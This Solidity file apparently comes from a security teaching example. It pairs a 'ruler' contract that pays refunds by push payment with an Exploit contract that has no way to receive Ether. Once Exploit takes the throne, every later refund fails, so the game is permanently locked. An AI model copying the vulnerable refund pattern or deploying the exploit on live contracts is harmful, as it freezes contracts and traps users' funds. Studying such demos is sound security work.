// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract RulerOfEther {
    address public ruler;
    uint256 public balance;

    function claimRule() external payable {
        require(msg.value > balance, "Need to pay more to become the ruler");

        (bool sent, ) = ruler.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.value;
        ruler = msg.sender;
    }
}

contract Exploit {
    RulerOfEther rulerOfEther;

    constructor(RulerOfEther _rulerOfEther) {
        rulerOfEther = RulerOfEther(_rulerOfEther);
    }
    function attack() public payable {
        rulerOfEther.claimRule{value: msg.value}();
    }
}